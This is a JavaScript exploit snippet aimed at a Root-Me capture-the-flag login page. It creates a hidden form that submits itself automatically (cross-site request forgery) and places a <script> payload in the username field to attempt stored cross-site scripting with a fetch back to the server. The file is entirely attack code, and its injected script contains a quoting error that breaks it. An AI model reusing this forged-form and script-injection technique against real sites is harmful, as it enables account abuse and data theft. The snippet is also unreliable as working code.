let url = "http://challenge01.root-me.org:58003/login"

let nullOpener = window.opener == null ? "yes":"non"
let payload={
    username :`<script>const url = ${url};

    const data = {
        nullOpener: "${nullOpener}",
    };
    
    fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data) 
    })
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
      }
      return response.json();
    })
    .then(data => {
      console.log('Success:', data); 
    })
    .catch(error => {
      console.error('There was a problem with the fetch operation:', error);
    });</script>`,
    secret: "aa",
}
const form = document.createElement('form');
form.method = 'POST';
form.action = url;
form.style.visibility = 'hidden'; 
for (const key of Object.keys(payload)) {
    var input = document.createElement('input');
    input.name = key;
    input.value = payload[key];
    form.appendChild(input);
  }
  document.body.appendChild(form); 
  form.submit(); 

